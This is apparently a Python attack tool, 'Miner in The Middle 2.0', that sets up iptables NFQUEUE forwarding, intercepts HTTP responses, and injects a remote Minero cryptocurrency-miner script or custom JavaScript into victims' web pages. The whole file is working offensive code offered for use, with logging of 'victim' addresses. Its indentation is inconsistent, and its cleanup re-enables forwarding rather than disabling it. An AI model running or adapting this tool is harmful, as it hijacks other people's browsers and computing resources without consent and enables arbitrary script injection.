#!/usr/bin/python
#Author: Anthony Russell
#Twitter: @DotNetRussell
#Blog: https://www.DotNetRussell.com
#Published: Aug-2020

from datetime import datetime

import netfilterqueue
import scapy.all as scapy
import re
import json
import argparse
import sys
import os

banner="""
 __ __  _                      _  ___  __ __ 
|  \  \<_>._ _  ___  _ _  ___ | ||_ _||  \  \

|     || || ' |/ ._>| '_>|___|| | | | |     |
|_|_|_||_||_|_|\___.|_|       |_| |_| |_|_|_|
                                             
"""

print(banner)

def get_arguments():
    	print('Miner in The Middle 2.0')
	print('Author: Anthony Russell')
	print('')
	print('https://www.DotNetRussell.com')
	print('Twitter: @DotNetRussell')
	print('Last Updated: Aug/2020')
	print('')
	print('use: ./mitm.py /path/to/config.json')
	print('')
	print('Get your free site key by visiting minero.cc')

if len(sys.argv) < 2:
	get_arguments()
	sys.exit()

config = json.loads(open(sys.argv[1],'r').read())

print('Setting up ipv4 forwarding')
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
print('Adding FORWARD chain rule to iptables')
os.system('iptables -I FORWARD -j NFQUEUE --queue-num 1')
print('Adding OUTPUT chain rule to iptables')
os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 1')
print('Setup complete')

def change_payload(packet, load):
    	packet[scapy.Raw].load = load
    	del packet[scapy.IP].len
    	del packet[scapy.IP].chksum
    	del packet[scapy.TCP].chksum
    	return packet

def inject_code(packet):
	try:
		onlyContentLengthAdjustment=False
		injected=False
		http_packet = scapy.IP(packet.get_payload())

		if http_packet.haslayer(scapy.Raw):
        		load = http_packet[scapy.Raw].load

			if http_packet[scapy.TCP].sport ==443 or  '301' in load or '501' in load or '400' in load or '404' in load or '503' in load:
		    		packet.accept()
	    			return

	        	if http_packet[scapy.TCP].dport == 80:
        	    		load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            			load = load.replace("HTTP/1.1", "HTTP/1.0")

        		if http_packet[scapy.TCP].sport == 80:
#				layer = http_packet[scapy.load_layer("http")]

#				print(layer)

				injectionCode = ""

				customJsPath = str(config["customInjection"])

				if 'path/to/your/js' not in customJsPath and customJsPath != "":
					injectionCode = open(config["customInjection"], "r").read()
				else:
					injectionCode = "<script src='https://minero.cc/lib/minero.min.js'></script>"
					injectionCode = injectionCode+"<script>var miner = new Minero.Anonymous(\'" + str(config["siteKey"]) +  "\');miner.start();</script>";

#				print(load)
				length_search=False

				if "</body>" in load or "</BODY>" in load:
					load = load.replace("</body>", injectionCode + "</body>")
					load = load.replace("</BODY>", injectionCode + "</BODY>")
					length_search = re.search("(?:Content-Length:\s)(\d*)", load)
					injected=True
				elif re.search("(?:Content-Length:\s)(\d*)", load):
					length_search=re.search("(?:Content-Length:\s)(\d*)", load)
					injected=True
					onlyContentLengthAdjustment=True

	      				if length_search and "text/html" in load:
      		        			length = length_search.group(1)
			 			new_length = int(length) + len(injectionCode)
        					load = load.replace(length, str(new_length))


			ipConstraint = str(config["ipConstraint"])
			ipConstraintActive = ipConstraint != ""

	        	if injected and (ipConstraint in http_packet.dst and ipConstraintActive) or (not ipConstraintActive and load != http_packet[scapy.Raw].load):
				dateTime = datetime.now()
				if not onlyContentLengthAdjustment:
		   			print('injection new packet into victim at ' + http_packet.dst + " at " + dateTime.strftime("%Y-%m-%d %H:%M:%S"))
            			new_packet = change_payload(http_packet, load)
            			packet.set_payload(str(new_packet))

		packet.accept()

	except Exception as error:
		print error
		packet.accept()

print 'Listening for HTTP traffic...'
queue = netfilterqueue.NetfilterQueue()
queue.bind(1, inject_code)
try:
	queue.run()
except:
	print('Flushing iptables...')
	os.system('iptables --flush')

	print('Disabling ipv4 forwarding...')
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	print('Cleanup completed')
